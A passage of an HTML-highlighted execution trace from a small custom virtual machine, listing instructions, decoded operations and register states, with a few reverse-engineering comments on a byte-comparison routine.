class="hljs-number">0x5f</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x83</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x84</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x85</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x86</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x41</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x41</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x87</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x31</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x31</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x88</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x89</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x42</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x42</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x38</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x38</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x90</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x43</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x43</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x91</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x8f</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x8f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x92</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x93</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x94</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x95</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x44</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x44</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x96</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x89</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x89</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x97</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x98</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x89</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x99</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x89</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x9a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK c NONE<br>[<span class="hljs-meta">s</span>] ... popping c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x89</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x9b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK b NONE<br>[<span class="hljs-meta">s</span>] ... popping b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x9c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK a NONE<br>[<span class="hljs-meta">s</span>] ... popping a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x9d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x9d</span><br>[<span class="hljs-meta">s</span>] IMM i = <span class="hljs-number">0x9d</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x9e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x30</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x30</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x9f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0xa3</span><br>[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0xa3</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa0</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x15</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x15</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa1</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0x2</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x2</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa2</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x4</span><br>[<span class="hljs-meta">s</span>] ADD d i<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa3</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] STK NONE d<br>[<span class="hljs-meta">s</span>] ... pushing d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0xa4</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] IMM i = <span class="hljs-number">0x2</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x3</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD a c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x45</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x4</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x45</span> b:<span class="hljs-number">0xb8</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x5</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0xff</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0xff</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x45</span> b:<span class="hljs-number">0xb8</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x6</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] ADD a d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb8</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x7</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] ADD b d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x8</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] STK NONE a<br>[<span class="hljs-meta">s</span>] ... pushing a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x9</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STK NONE b<br>[<span class="hljs-meta">s</span>] ... pushing b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xa</span> f:<span class="hljs-number">0</span>				<span class="hljs-meta">#######</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM a = *a										<span class="hljs-meta"># a1[0x44]</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xb</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] LDM b = *b										<span class="hljs-meta"># a1[0xb7]</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0x5b</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xc</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x8</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] CMP a b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0x5b</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xd</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK b NONE<br>[<span class="hljs-meta">s</span>] ... popping b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0xe</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK a NONE<br>[<span class="hljs-meta">s</span>] ... popping a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0xf</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x16</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0x16</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x16</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x10</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x10</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">j</span>] JMP N d<br>[<span class="hljs-meta">j</span>] ... TAKEN<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x16</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x17</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] STK d c<br>[<span class="hljs-meta">s</span>] ... pushing c<br>[<span class="hljs-meta">s</span>] ... popping d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x18</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK i NONE<br>[<span class="hljs-meta">s</span>] ... popping i<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa5</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa6</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x8</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] CMP d c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa7</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0xaa</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0xaa</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0xaa</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa8</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x10</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">j</span>] JMP E d<br>[<span class="hljs-meta">j</span>] ... NOT TAKEN<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0xaa</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa9</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x18</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0x18</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xaa</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x10</span> arg1:<span class="hljs-number">0x12</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">j</span>] JMP LG d<br>[<span class="hljs-meta">j</span>] ... TAKEN<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x19</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0xd4</span><br>[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0xd4</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xd4</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x1a</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xa</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xa</span><br>[<span class="hljs-meta">V</span>] a:<span 